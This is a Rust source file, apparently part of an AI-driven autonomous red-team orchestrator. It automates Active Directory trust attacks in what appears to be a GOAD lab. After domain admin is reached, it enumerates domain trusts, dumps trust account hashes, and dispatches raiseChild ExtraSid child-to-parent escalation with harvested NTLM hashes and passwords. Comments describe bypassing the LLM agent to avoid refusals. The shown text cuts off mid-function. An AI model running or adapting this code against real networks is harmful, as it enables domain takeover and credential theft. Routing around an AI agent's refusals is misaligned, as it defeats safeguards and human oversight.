//! auto_trust_follow -- trust enumeration, key extraction, and cross-domain attacks.
//!
//! Three-phase automation:
//!
//! 1. **Trust enumeration**: When DA is achieved, dispatch `enumerate_domain_trusts`
//!    to discover trust relationships via LDAP.
//! 2. **Trust key extraction**: When trusts are known and DA creds are available,
//!    dispatch secretsdump for trust account hashes (e.g. `FABRIKAM$`).
//! 3. **Trust follow**: When a trust account hash is found, dispatch inter-realm
//!    ticket creation and secretsdump against the foreign DC.

use std::collections::HashSet;
use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use ares_llm::ToolCall;

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Build a vuln_id for child-to-parent escalation.
fn child_to_parent_vuln_id(child_domain: &str, parent_domain: &str) -> String {
    format!(
        "child_to_parent_{}_{}",
        child_domain.to_lowercase().replace('.', "_"),
        parent_domain.to_lowercase().replace('.', "_"),
    )
}

/// Build a vuln_id for forest trust escalation.
fn forest_trust_vuln_id(source_domain: &str, target_domain: &str) -> String {
    format!(
        "forest_trust_{}_{}",
        source_domain.to_lowercase(),
        target_domain.to_lowercase()
    )
}

/// Build a trust account name from a flat name (e.g. "FABRIKAM" -> "FABRIKAM$").
fn trust_account_name(flat_name: &str) -> String {
    format!("{}$", flat_name.to_uppercase())
}

/// Returns true when source and target are in different forests
/// (neither is a parent or child of the other, and they are not equal).
///
/// Inter-forest trusts are subject to SID filtering on the target DC, which
/// strips ExtraSid claims with RID < 1000 (Enterprise Admins, Domain Admins,
/// Administrator). The inter-realm TGT authenticates but the privileged claim
/// is silently dropped — DCSync against the target DC then fails with
/// `rpc_s_access_denied`. This helper distinguishes the doomed path from
/// child→parent escalation (intra-forest), which is exploitable.
fn is_inter_forest(source: &str, target: &str) -> bool {
    let s = source.to_lowercase();
    let t = target.to_lowercase();
    if s.is_empty() || t.is_empty() || s == t {
        return false;
    }
    if s.ends_with(&format!(".{t}")) || t.ends_with(&format!(".{s}")) {
        return false;
    }
    true
}

/// Returns true if the trust source→target is inter-forest with SID filtering
/// active — meaning `forge_inter_realm_and_dump` will be rejected at DCSync
/// regardless of trust key validity. Caller should suppress the doomed
/// dispatch and accelerate cross-forest fallback paths instead.
///
/// Decision tree:
/// - Intra-forest (child↔parent or same domain): false (raise_child handles it)
/// - Explicit `TrustInfo` with `is_cross_forest()` and `sid_filtering=true`: true
/// - Explicit `TrustInfo` with `is_cross_forest()` and `sid_filtering=false`:
///   false (someone disabled SID filtering — try the forge)
/// - No `TrustInfo` but the names are inter-forest: false (try the forge —
///   missing metadata means we can't be sure SID filtering is on, and the
///   ~30s cost of an unnecessary attempt is cheaper than silently dropping
///   a valid attack path on a misconfigured trust)
fn is_filtered_inter_forest_trust(state: &StateInner, source: &str, target: &str) -> bool {
    if !is_inter_forest(source, target) {
        return false;
    }
    let target_l = target.to_lowercase();
    // Look up only the target's metadata. `trusted_domains` is keyed by the
    // foreign-side domain name in each enumeration result, so the entry for
    // `target_l` describes the source→target relationship. Falling back to
    // the source key returns *some other* trust the source happens to have
    // (e.g. north→sevenkingdoms parent_child stored under "sevenkingdoms.local"
    // when we query sevenkingdoms→essos), which would wrongly classify the
    // unknown cross-forest path as intra-forest and let the doomed forge fire.
    if let Some(t) = state.trusted_domains.get(&target_l) {
        if t.is_cross_forest() {
            return t.sid_filtering;
        }
        // Trust enumeration disagrees with name-based heuristic — trust the
        // explicit metadata (e.g. unusual same-forest cross-DNS-suffix setup).
        return false;
    }
    // No metadata — try the forge. False positives (SID filtering actually on)
    // cost ~30s for a doomed DCSync attempt; false negatives (refusing a valid
    // attack on a misconfigured trust where SID filtering is off) cost the
    // entire foreign domain. Prefer the cheaper failure mode.
    false
}

/// Clear cross-forest fallback dedup keys for `target_domain` so the next
/// tick of `auto_cross_forest_enum`, `auto_foreign_group_enum`, and
/// `auto_acl_discovery` re-fires against the foreign forest with current
/// credentials. Called when a doomed forest_trust_escalation is suppressed
/// — the trust hash extraction usually populates new state (DC IPs, SIDs)
/// that should kick the fallbacks back into action.
async fn wake_cross_forest_fallbacks(dispatcher: &Dispatcher, target_domain: &str) {
    let target_l = target_domain.to_lowercase();
    // (set_name, prefix) pairs — must stay in sync with the auto_*_enum
    // dedup-key formats in their respective modules.
    let mut prefixes: Vec<(&str, String)> = vec![
        (DEDUP_CROSS_FOREST_ENUM, format!("xforest:{target_l}:")),
        (
            DEDUP_FOREIGN_GROUP_ENUM,
            format!("foreign_group:{target_l}"),
        ),
        (DEDUP_ACL_DISCOVERY, format!("acl_disc:{target_l}:")),
    ];

    // ADCS dedup keys are `{host}:cred:{user@dom}` / `{host}:hash:{user@dom}`,
    // keyed on the CA host (IP or hostname) — not the target domain. So for
    // each known host that belongs to `target_domain`, add a `{host}:` prefix.
    // This lets a freshly-acquired cross-forest credential re-attempt
    // certipy_find against an essos CA that was previously locked by a wrong
    // initial cred.
    {
        let s = dispatcher.state.read().await;
        let suffix = format!(".{target_l}");
        for h in s.hosts.iter() {
            let hostname = h.hostname.to_lowercase();
            let belongs =
                !hostname.is_empty() && (hostname == target_l || hostname.ends_with(&suffix));
            if !belongs {
                continue;
            }
            if !h.ip.is_empty() {
                prefixes.push((DEDUP_ADCS_SERVERS, format!("{}:", h.ip)));
            }
            prefixes.push((DEDUP_ADCS_SERVERS, format!("{hostname}:")));
        }
    }

    let cleared: Vec<(&str, Vec<String>)> = {
        let mut s = dispatcher.state.write().await;
        prefixes
            .iter()
            .map(|(set, prefix)| (*set, s.unmark_processed_by_prefix(set, prefix)))
            .filter(|(_, v)| !v.is_empty())
            .collect()
    };
    let cleared_count: usize = cleared.iter().map(|(_, v)| v.len()).sum();
    if cleared_count == 0 {
        // Nothing to clear means ACL/cross-forest enum never ran against this
        // target — usually because no same-realm credential exists. Fallback
        // wake is a no-op here; the orchestrator will keep flailing on
        // NTLM-bound paths that 0x52e against the foreign forest. Logging
        // this signal makes the architectural gap visible in the trace.
        info!(
            target = %target_domain,
            "wake_cross_forest_fallbacks: no dedup keys to clear — \
             ACL/foreign-group/cross-forest enum never registered for this \
             target (likely no same-realm credential). Forge-only fallback \
             via create_inter_realm_ticket would be needed to bind LDAP \
             via Kerberos."
        );
    } else {
        info!(
            target = %target_domain,
            cleared_count,
            "wake_cross_forest_fallbacks: cleared dedup keys to retrigger fallback enums"
        );
    }
    for (set, keys) in cleared {
        for key in keys {
            let _ = dispatcher
                .state
                .unpersist_dedup(&dispatcher.queue, set, &key)
                .await;
        }
    }
}

/// Check if a credential domain matches a target domain (exact, child, or parent).
fn is_domain_related(cred_domain: &str, target_domain: &str) -> bool {
    let cd = cred_domain.to_lowercase();
    let td = target_domain.to_lowercase();
    cd == td || cd.ends_with(&format!(".{td}")) || td.ends_with(&format!(".{cd}"))
}

/// Build the dedup key for trust enumeration (password or hash retry).
fn trust_enum_dedup_key(domain: &str, is_hash_retry: bool) -> String {
    if is_hash_retry {
        format!("trust_enum_hash:{}", domain.to_lowercase())
    } else {
        format!("trust_enum:{}", domain.to_lowercase())
    }
}

/// Monitors for trust account hashes and dispatches cross-domain attacks.
/// Interval: 30s.
pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Auto-enumerate trusts when DA is achieved
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin {
                // Dispatch trust enumeration for each known DC.
                // Two dedup keys per domain:
                //   trust_enum:<domain> — password-based attempt
                //   trust_enum_hash:<domain> — hash-based retry (for dominated domains)
                //
                // Iterate the union of `domain_controllers` keys and
                // `dominated_domains`. The latter covers the case where a
                // domain was compromised (e.g. via raise_child to the parent)
                // but its DC was never explicitly seeded into
                // `domain_controllers` — without this, parent-DC trust
                // enumeration would never fire and cross-forest trusts would
                // remain undiscovered.
                let mut candidate_domains: HashSet<String> = state
                    .domain_controllers
                    .keys()
                    .map(|d| d.to_lowercase())
                    .collect();
                for d in state.dominated_domains.iter() {
                    candidate_domains.insert(d.to_lowercase());
                }
                let enum_work: Vec<(String, String, String)> = candidate_domains
                    .iter()
                    .filter_map(|domain| {
                        let dc_ip = state.resolve_dc_ip(domain)?;
                        let pw_key = trust_enum_dedup_key(domain, false);
                        let hash_key = trust_enum_dedup_key(domain, true);
                        let pw_done = state.is_processed(DEDUP_TRUST_FOLLOW, &pw_key);
                        let hash_done = state.is_processed(DEDUP_TRUST_FOLLOW, &hash_key);
                        let dominated = state.dominated_domains.contains(domain);
                        // Skip if password attempt is done AND (no hash retry
                        // applies, or hash retry already done).
                        if pw_done && (!dominated || hash_done) {
                            return None;
                        }
                        let key = if pw_done { hash_key } else { pw_key };
                        Some((key, domain.clone(), dc_ip))
                    })
                    .collect();
                drop(state);

                for (key, domain, dc_ip) in enum_work {
                    // Find a credential for this domain — prefer password creds,
                    // fall back to admin NTLM hash for hash-based LDAP auth.
                    let (cred_payload, auth_method) = {
                        let s = dispatcher.state.read().await;
                        let dd = domain.to_lowercase();

                        // On hash-based retry, skip password creds entirely —
                        // they already failed on the first attempt (typically a
                        // child-domain credential that can't LDAP-bind to the
                        // parent DC with the wrong domain context).
                        let is_hash_retry = key.starts_with("trust_enum_hash:");

                        // First try: password credential (exact or child↔parent match)
                        let pw_cred = if !is_hash_retry {
                            s.credentials
                                .iter()
                                .find(|c| {
                                    if c.password.is_empty() {
                                        return false;
                                    }
                                    is_domain_related(&c.domain, &domain)
                                })
                                .cloned()
                        } else {
                            None
                        };

                        if let Some(cred) = pw_cred {
                            (
                                Some(json!({
                                    "username": cred.username,
                                    "password": cred.password,
                                    "domain": cred.domain,
                                })),
                                "password",
                            )
                        } else {
                            // Fallback: find an admin NTLM hash for this exact domain
                            let admin_hash = s.hashes.iter().find(|h| {
                                h.hash_type.to_lowercase() == "ntlm"
                                    && h.domain.to_lowercase() == dd
                                    && h.username.to_lowercase() == "administrator"
                            });
                            if let Some(h) = admin_hash {
                                (
                                    Some(json!({
                                        "username": "Administrator",
                                        "hash": h.hash_value.clone(),
                                        "domain": domain,
                                    })),
                                    "hash",
                                )
                            } else {
                                (None, "none")
                            }
                        }
                    };

                    if let Some(cred_json) = cred_payload {
                        // Direct tool dispatch — bypass the LLM agent loop.
                        // The recon prompt template did not surface
                        // `credential.hash` (only password), so LLM-driven trust
                        // enumeration with hash auth would render an empty
                        // password and fail with LDAP 52e. The orchestrator
                        // already owns every input here; deliver them directly
                        // to enumerate_domain_trusts via dispatch_tool.
                        let mut args = json!({
                            "target": dc_ip,
                            "domain": domain,
                            "username": cred_json
                                .get("username")
                                .and_then(|v| v.as_str())
                                .unwrap_or(""),
                        });
                        if let Some(p) = cred_json
                            .get("password")
                            .and_then(|v| v.as_str())
                            .filter(|s| !s.is_empty())
                        {
                            args["password"] = json!(p);
                        }
                        if let Some(h) = cred_json
                            .get("hash")
                            .and_then(|v| v.as_str())
                            .filter(|s| !s.is_empty())
                        {
                            args["hash"] = json!(h);
                        }
                        if let Some(bd) = cred_json
                            .get("domain")
                            .and_then(|v| v.as_str())
                            .filter(|s| !s.is_empty() && !s.eq_ignore_ascii_case(&domain))
                        {
                            args["bind_domain"] = json!(bd);
                        }

                        let call = ToolCall {
                            id: format!("trust_enum_{}", uuid::Uuid::new_v4().simple()),
                            name: "enumerate_domain_trusts".to_string(),
                            arguments: args,
                        };
                        let task_id = format!(
                            "trust_enum_{}",
                            &uuid::Uuid::new_v4().simple().to_string()[..12]
                        );

                        // Mark dedup BEFORE spawn so the next 30s tick doesn't
                        // re-dispatch while enumeration is in flight.
                        dispatcher
                            .state
                            .write()
                            .await
                            .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                        let _ = dispatcher
                            .state
                            .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                            .await;

                        info!(
                            task_id = %task_id,
                            domain = %domain,
                            dc_ip = %dc_ip,
                            auth = auth_method,
                            "Dispatching enumerate_domain_trusts (direct tool, no LLM)"
                        );

                        let dispatcher_bg = dispatcher.clone();
                        let domain_bg = domain.clone();
                        let key_bg = key.clone();
                        let auth_method_bg = auth_method.to_string();
                        tokio::spawn(async move {
                            let result = dispatcher_bg
                                .llm_runner
                                .tool_dispatcher()
                                .dispatch_tool("recon", &task_id, &call)
                                .await;
                            // Failure handling depends on which auth attempt
                            // just failed:
                            //
                            // - password attempt: leave the dedup mark in place
                            //   so the next 30s tick sees `pw_done=true` and
                            //   escalates to the hash-key path (gated on the
                            //   domain being in `dominated_domains`). Clearing
                            //   the mark would loop forever on the same wrong
                            //   sibling-domain credential.
                            // - hash attempt: clear so a future tick can retry
                            //   if a fresh hash becomes available.
                            let clear_dedup = || async {
                                dispatcher_bg
                                    .state
                                    .write()
                                    .await
                                    .unmark_processed(DEDUP_TRUST_FOLLOW, &key_bg);
                                let _ = dispatcher_bg
                                    .state
                                    .unpersist_dedup(
                                        &dispatcher_bg.queue,
                                        DEDUP_TRUST_FOLLOW,
                                        &key_bg,
                                    )
                                    .await;
                            };
                            let on_failure = || async {
                                if auth_method_bg == "password" {
                                    // Mark stays — escalation to hash retry on next tick.
                                } else {
                                    clear_dedup().await;
                                }
                            };
                            match result {
                                Ok(exec_result) => {
                                    if let Some(err) = exec_result.error.as_ref() {
                                        warn!(
                                            err = %err,
                                            domain = %domain_bg,
                                            auth = %auth_method_bg,
                                            "enumerate_domain_trusts returned error"
                                        );
                                        on_failure().await;
                                        return;
                                    }
                                    let trust_count = exec_result
                                        .discoveries
                                        .as_ref()
                                        .and_then(|d| d.get("trusted_domains"))
                                        .and_then(|t| t.as_array())
                                        .map(|a| a.len())
                                        .unwrap_or(0);
                                    info!(
                                        domain = %domain_bg,
                                        trust_count = trust_count,
                                        "enumerate_domain_trusts completed"
                                    );
                                }
                                Err(e) => {
                                    warn!(
                                        err = %e,
                                        domain = %domain_bg,
                                        auth = %auth_method_bg,
                                        "enumerate_domain_trusts dispatch errored"
                                    );
                                    on_failure().await;
                                }
                            }
                        });
                    }
                }
            }
        }

        // Child-to-parent escalation (ExtraSid via raiseChild)
        //
        // Dispatches when a child domain is dominated and its parent FQDN is
        // known. We derive the parent FQDN by stripping the leftmost label of
        // the dominated child (always valid intra-forest — child FQDN is
        // `{label}.{parent_fqdn}` by AD construction), then ALSO union with
        // any explicit parent_child trusts discovered via LDAP enumeration.
        //
        // The intra-forest derivation lets us fire immediately on child DA,
        // bypassing the trust enumeration round-trip — without it we'd block
        // until `trusted_domains` was populated, which sometimes never
        // happens (LLM refusal, network, throttle starvation).
        {
            let state = dispatcher.state.read().await;
            // Build the candidate child set as the union of dominated domains
            // (krbtgt observed) and domains where we have a non-empty
            // Administrator NTLM hash. The latter covers the common case where
            // GOAD-style password reuse gives us a working DA hash via local
            // SAM dumps before we ever DCSync krbtgt — without it the trust
            // automation deadlocks waiting for krbtgt.
            let mut candidate_children: HashSet<String> = state
                .dominated_domains
                .iter()
                .map(|d| d.to_lowercase())
                .collect();
            for h in state.hashes.iter() {
                if h.username.eq_ignore_ascii_case("administrator")
                    && h.hash_type.eq_ignore_ascii_case("NTLM")
                    && !h.hash_value.is_empty()
                    && !h.domain.is_empty()
                {
                    candidate_children.insert(h.domain.to_lowercase());
                }
            }
            if !candidate_children.is_empty() {
                let mut child_work: Vec<(String, String, String, String)> = Vec::new();

                // Path A: derived intra-forest. For each candidate child (FQDN
                // with 3+ labels), the parent is `labels[1..].join(".")`.
                for child_domain in candidate_children.iter() {
                    let cd_lower = child_domain.to_lowercase();
                    let labels: Vec<&str> = cd_lower.split('.').collect();
                    if labels.len() < 3 {
                        continue;
                    }
                    let parent_domain = labels[1..].join(".");
                    if parent_domain.is_empty() || !parent_domain.contains('.') {
                        continue;
                    }
                    if state.dominated_domains.contains(&parent_domain) {
                        continue;
                    }
                    // Require parent DC IP resolvable (via domain_controllers
                    // or hosts table) so secretsdump has a target IP.
                    let parent_dc_ip = match state.resolve_dc_ip(&parent_domain) {
                        Some(ip) => ip,
                        None => continue,
                    };
                    let key = format!("raise_child:{}", cd_lower);
                    if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                        continue;
                    }
                    let child_dc_ip = match state.domain_controllers.get(&cd_lower) {
                        Some(ip) => ip.clone(),
                        None => continue,
                    };
                    let _ = parent_dc_ip; // resolved later under fresh read lock
                    child_work.push((key, child_domain.clone(), parent_domain, child_dc_ip));
                }

                // Path B: explicit parent_child trusts from LDAP enumeration.
                // Skip duplicates of Path A (same dedup key).
                if !state.trusted_domains.is_empty() {
                    for trust in state.trusted_domains.values() {
                        if !trust.is_parent_child() {
                            continue;
                        }
                        let parent_domain = trust.domain.clone();
                        if state
                            .dominated_domains
                            .contains(&parent_domain.to_lowercase())
                        {
                            continue;
                        }
                        let child_domain = match candidate_children.iter().find(|d| {
                            d.to_lowercase()
                                .ends_with(&format!(".{}", parent_domain.to_lowercase()))
                        }) {
                            Some(d) => d.clone(),
                            None => continue,
                        };
                        let key = format!("raise_child:{}", child_domain.to_lowercase());
                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
                            continue;
                        }
                        if child_work.iter().any(|(k, _, _, _)| k == &key) {
                            continue;
                        }
                        let child_dc_ip =
                            match state.domain_controllers.get(&child_domain.to_lowercase()) {
                                Some(ip) => ip.clone(),
                                None => continue,
                            };
                        child_work.push((key, child_domain, parent_domain, child_dc_ip));
                    }
                }

                drop(state);

                for (key, child_domain, parent_domain, dc_ip) in child_work {
                    // Find admin credential for the child domain:
                    // prefer password, fall back to NTLM hash.
                    let (cred_payload, auth_method): (Option<serde_json::Value>, &str) = {
                        let s = dispatcher.state.read().await;
                        let cd = child_domain.to_lowercase();

                        let pw_cred = s
                            .credentials
                            .iter()
                            .find(|c| {
                                c.is_admin
                                    && !c.password.is_empty()
                                    && c.domain.to_lowercase() == cd
                            })
                            .cloned();

                        if let Some(cred) = pw_cred {
                            (
                                Some(json!({
                                    "username": cred.username,
                                    "password": cred.password,
                                })),
                                "password",
                            )
                        } else {
                            let admin_hash = s
                                .hashes
                                .iter()
                                .find(|h| {
                                    h.username.to_lowercase() == "administrator"
                                        && h.domain.to_lowercase() == cd
                                        && h.hash_type.to_uppercase() == "NTLM"
                                })
                                .cloned();

                            if let Some(h) = admin_hash {
                                (
                                    Some(json!({
                                        "username": "Administrator",
                                        "admin_hash": h.hash_value,
                                    })),
                                    "hash",
                                )
                            } else {
                                (None, "none")
                            }
                        }
                    };

                    let cred = match cred_payload {
                        Some(c) => c,
                        None => {
                            debug!(
                                child_domain = %child_domain,
                                parent_domain = %parent_domain,
                                "No admin cred/hash for child domain — deferring child-to-parent"
                            );
                            continue;
                        }
                    };

                    // Publish vulnerability
                    let vuln_id = child_to_parent_vuln_id(&child_domain, &parent_domain);
                    {
                        let mut details = std::collections::HashMap::new();
                        details.insert(
                            "source_domain".into(),
                            serde_json::Value::String(child_domain.clone()),
                        );
                        details.insert(
                            "target_domain".into(),
                            serde_json::Value::String(parent_domain.clone()),
                        );
                        details.insert(
                            "note".into(),
                            serde_json::Value::String(format!(
                                "Child-to-parent escalation via ExtraSid — {} → {}",
                                child_domain, parent_domain
                            )),
                        );
                        let vuln = ares_core::models::VulnerabilityInfo {
                            vuln_id: vuln_id.clone(),
                            vuln_type: "child_to_parent".to_string(),
                            target: dc_ip.clone(),
                            discovered_by: "trust_automation".to_string(),
                            discovered_at: chrono::Utc::now(),
                            details,
                            recommended_agent: String::new(),
                            priority: 1,
                        };
                        let _ = dispatcher
                            .state
                            .publish_vulnerability(&dispatcher.queue, vuln)
                            .await;
                    }

                    // Dispatch child-to-parent exploit task.  The LLM prompt
                    // offers raiseChild (automated) and manual ExtraSid golden
                    // ticket creation as alternatives.
                    // `dc_ip` is the child DC (for trust key extraction).
                    // `target` should be the parent DC (for secretsdump after forging ticket).
                    // Use resolve_dc_ip so the hosts table fills in when
                    // domain_controllers lacks the parent — falls back to the
                    // child DC only as a last resort (DCSync can succeed
                    // against any writable DC in the parent domain).
                    let parent_dc_ip = {
                        let s = dispatcher.state.read().await;
                        s.resolve_dc_ip(&parent_domain)
                            .unwrap_or_else(|| dc_ip.clone())
                    };
                    let mut payload = json!({
                        "technique": "create_inter_realm_ticket",
                        "vuln_type": "child_to_parent",
                        "domain": child_domain,
                        "trusted_domain": parent_domain,
                        "target_domain": parent_domain,
                        "target": &parent_dc_ip,
                        "dc_ip": dc_ip,
                        "vuln_id": &vuln_id,
                    });
                    // Merge credential fields
                    if let Some(obj) = cred.as_object() {
                        for (k, v) in obj {
                            payload[k] = v.clone();
                        }
                    }
                    // Add domain SIDs and child krbtgt (for ExtraSid via child
                    // krbtgt — preferred path, no inter-realm trust key needed).
                    //
                    // The ExtraSid attack requires the PARENT forest SID (RID 519
                    // = Enterprise Admins). If we ship the child SID by mistake,
                    // the parent KDC rejects the ticket with KDC_ERR_PREAUTH_FAILED
                    // because the embedded SID doesn't resolve to a real EA group.
                    // So if the parent SID isn't cached, resolve it via lookupsid
                    // against the parent DC using child admin creds (cross-trust
                    // SAMR works) BEFORE dispatching the exploit task. Defer the
                    // dispatch (no dedup mark) when resolution fails so the next
                    // 30s tick can retry once host scans / DC enumeration progress.
                    let parent_lower = parent_domain.to_lowercase();
                    let cd_lower = child_domain.to_lowercase();
                    let (
                        mut have_target_sid,
                        mut have_source_sid,
                        child_admin_cred,
                        child_admin_hash,
                        child_dc_ip,
                    ) = {
                        let s = dispatcher.state.read().await;
                        if let Some(sid) = s.domain_sids.get(&cd_lower) {
                            payload["source_sid"] = json!(sid);
                        }
                        if let Some(sid) = s.domain_sids.get(&parent_lower) {
                            payload["target_sid"] = json!(sid);
                        }
                        if let Some(child_krbtgt) = s.hashes.iter().find(|h| {
                            h.username.eq_ignore_ascii_case("krbtgt")
                                && h.domain.to_lowercase() == cd_lower
                                && h.hash_type.to_uppercase() == "NTLM"
                        }) {
                            payload["child_krbtgt_hash"] = json!(child_krbtgt.hash_value);
                        }
                        let admin_cred = s
                            .credentials
                            .iter()
                            .find(|c| {
                                c.is_admin
                                    && !c.password.is_empty()
                                    && c.domain.to_lowercase() == cd_lower
                            })
                            .cloned();
                        let admin_hash = s
                            .hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == "administrator"
                                    && h.domain.to_lowercase() == cd_lower
                                    && h.hash_type.to_uppercase() == "NTLM"
                            })
                            .cloned();
                        let child_dc = s.resolve_dc_ip(&child_domain);
                        (
                            s.domain_sids.contains_key(&parent_lower),
                            s.domain_sids.contains_key(&cd_lower),
                            admin_cred,
                            admin_hash,
                            child_dc,
                        )
                    };

                    if !have_target_sid {
                        if let Some((sid, admin_name)) = super::golden_ticket::resolve_domain_sid(
                            &parent_domain,
                            &parent_dc_ip,
                            child_admin_cred.as_ref(),
                            child_admin_hash.as_ref(),
                        )
                        .await
                        {
                            info!(
                                parent_domain = %parent_domain,
                                sid = %sid,
                                "Resolved parent domain SID via lookupsid for child-to-parent ExtraSid"
                            );
                            let op_id = { dispatcher.state.read().await.operation_id.clone() };
                            let reader = ares_core::state::RedisStateReader::new(op_id);
                            let mut conn = dispatcher.queue.connection();
                            let _ = reader.set_domain_sid(&mut conn, &parent_lower, &sid).await;
                            if let Some(ref name) = admin_name {
                                let _ = reader.set_admin_name(&mut conn, &parent_lower, name).await;
                            }
                            {
                                let mut state = dispatcher.state.write().await;
                                state.domain_sids.insert(parent_lower.clone(), sid.clone());
                                if let Some(ref name) = admin_name {
                                    state.admin_names.insert(parent_lower.clone(), name.clone());
                                }
                            }
                            payload["target_sid"] = json!(sid);
                            have_target_sid = true;
                        } else {
                            warn!(
                                child_domain = %child_domain,
                                parent_domain = %parent_domain,
                                parent_dc_ip = %parent_dc_ip,
                                "Could not resolve parent SID — deferring child-to-parent dispatch"
                            );
                        }
                    }
                    if !have_target_sid {
                        continue;
                    }

                    // Resolve child domain SID if not cached (needed for ExtraSid golden ticket)
                    if !have_source_sid {
                        if let Some(ref child_dc) = child_dc_ip {
                            if let Some((sid, admin_name)) =
                                super::golden_ticket::resolve_domain_sid(
                                    &child_domain,
                                    child_dc,
                                    child_admin_cred.as_ref(),
                                    child_admin_hash.as_ref(),
                                )
                                .await
                            {
                                info!(
                                    child_domain = %child_domain,
                                    sid = %sid,
                                    "Resolved child domain SID via lookupsid for child-to-parent ExtraSid"
                                );
                                let op_id = { dispatcher.state.read().await.operation_id.clone() };
                                let reader = ares_core::state::RedisStateReader::new(op_id);
                                let mut conn = dispatcher.queue.connection();
                                let _ = reader.set_domain_sid(&mut conn, &cd_lower, &sid).await;
                                if let Some(ref name) = admin_name {
                                    let _ = reader.set_admin_name(&mut conn, &cd_lower, name).await;
                                }
                                {
                                    let mut state = dispatcher.state.write().await;
                                    state.domain_sids.insert(cd_lower.clone(), sid.clone());
                                    if let Some(ref name) = admin_name {
                                        state.admin_names.insert(cd_lower.clone(), name.clone());
                                    }
                                }
                                payload["source_sid"] = json!(sid);
                                have_source_sid = true;
                            } else {
                                warn!(
                                    child_domain = %child_domain,
                                    child_dc_ip = %child_dc,
                                    "Could not resolve child SID — deferring child-to-parent dispatch"
                                );
                            }
                        } else {
                            warn!(
                                child_domain = %child_domain,
                                "No child DC IP available — deferring child-to-parent dispatch"
                            );
                        }
                    }
                    if !have_source_sid {
                        continue;
                    }

                    // Use raiseChild.py (impacket's canonical child→parent ExtraSid
                    // automation) via DIRECT tool dispatch (no LLM in the loop).
                    // This replaces the previous golden_ticket + secretsdump_kerberos
                    // combo, which fails because impacket's cross-realm referral is
                    // broken (fortra/impacket#315): a child-realm ticket presented
                    // to the parent KDC returns KDC_ERR_WRONG_REALM /
                    // KDC_ERR_PREAUTH_FAILED. raiseChild forges the inter-realm
                    // chain internally and dumps parent krbtgt + Administrator in
                    // one shot.
                    //
                    // Direct dispatch_tool bypasses the LLM agent loop entirely —
                    // the orchestrator owns every input (child admin hash, child
                    // DC IP, parent DC IP), so there is no value in laundering them
                    // through an LLM that might typo or omit args.
                    let admin_hash_value = child_admin_hash.as_ref().map(|h| h.hash_value.clone());
                    let admin_password = child_admin_cred
                        .as_ref()
                        .map(|c| c.password.clone())
                        .filter(|p| !p.is_empty());
                    if admin_hash_value.is_none() && admin_password.is_none() {
                        warn!(
                            child_domain = %child_domain,
                            parent_domain = %parent_domain,
                            "No child Administrator hash or password — deferring child-to-parent (raise_child needs auth)"
                        );
                        continue;
                    }

                    // raiseChild auto-discovers parent forest root via the
                    // child DC's trustedDomain LDAP objects and resolves DC IPs
                    // via DNS — script-level flags for IP/domain are unsupported
                    // (argparse exit 2). However, on workers without forest DNS,
                    // the bare domain FQDN (`north.sevenkingdoms.local`) won't
                    // resolve — so pass the IPs so the tool wrapper can
                    // pre-seed `/etc/hosts` before invoking impacket.
                    let mut raise_args = json!({
                        "child_domain": child_domain.clone(),
                        "username": "Administrator",
                    });
                    if let Some(h) = admin_hash_value {
                        raise_args["hash"] = json!(h);
                    } else if let Some(p) = admin_password {
                        raise_args["password"] = json!(p);
                    }
                    if let Some(ref ip) = child_dc_ip {
                        raise_args["child_dc_ip"] = json!(ip);
                    }
                    raise_args["parent_domain"] = json!(parent_domain.clone());
                    if !parent_dc_ip.is_empty() {
                        raise_args["parent_dc_ip"] = json!(parent_dc_ip.clone());
                    }

                    let call = ToolCall {
                        id: format!("raise_child_{}", uuid::Uuid::new_v4().simple()),
                        name: "raise_child".to_string(),
                        arguments: raise_args,
                    };
                    let task_id = format!(
                        "trust_raise_child_{}",
                        &uuid::Uuid::new_v4().simple().to_string()[..12]
                    );

                    // Mark dedup BEFORE spawning so the next 30s tick doesn't
                    // re-dispatch the same trust while raiseChild is running.
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
                        .await;

                    info!(
                        task_id = %task_id,
                        child_domain = %child_domain,
                        parent_domain = %parent_domain,
                        auth = auth_method,
                        "Dispatching raise_child (direct tool, no LLM)"
                    );

                    // Spawn so the trust loop continues processing other items
                    // while raiseChild runs (typically 30–120s). mark_exploited
                    // is gated on observed parent krbtgt — no premature marking.
                    let dispatcher_bg = dispatcher.clone();
                    let parent_domain_bg = parent_domain.clone();
                    let child_domain_bg = child_domain.clone();
                    let vuln_id_bg = vuln_id.clone();
                    tokio::spawn(async move {
                        let result = dispatcher_bg
                            .llm_runner
                            .tool_dispatcher()
                            .dispatch_tool("privesc", &task_id, &call)
                            .await;
                        match result {
                            Ok(exec_result) => {
                                if let Some(err) = exec_result.error.as_ref() {
                                    let tail: String = exec_result
                                        .output
                                        .chars()
                                        .rev()
                                        .take(2000)
                                        .collect::<String>()
                                        .chars()
                                        .rev()
                                        .collect();
                                    warn!(
                                        err = %err,
                                        child_domain = %child_domain_bg,
                                        parent_domain = %parent_domain_bg,
                                        output_tail = %tail,
                                        "raise_child returned error"
                                    );
                                    return;
                                }
                                // Verify parent compromise — only mark exploited
                                // when we actually observe parent krbtgt.
                                //
                                // Inspect exec_result.discoveries directly:
                                // dispatch_tool returns BEFORE push_realtime_discoveries
                                // finishes pumping hashes into state.hashes, so reading
                                // state here is too early and produces a false negative.
                                let parent_lower = parent_domain_bg.to_lowercase();
                                let has_parent_krbtgt = exec_result
                                    .discoveries
                                    .as_ref()
                                    .and_then(|d| d.get("hashes"))
                                    .and_then(|h| h.as_array())
                                    .map(|hashes| {
                                        hashes.iter().any(|h| {
                                            let user = h
                                                .get("username")
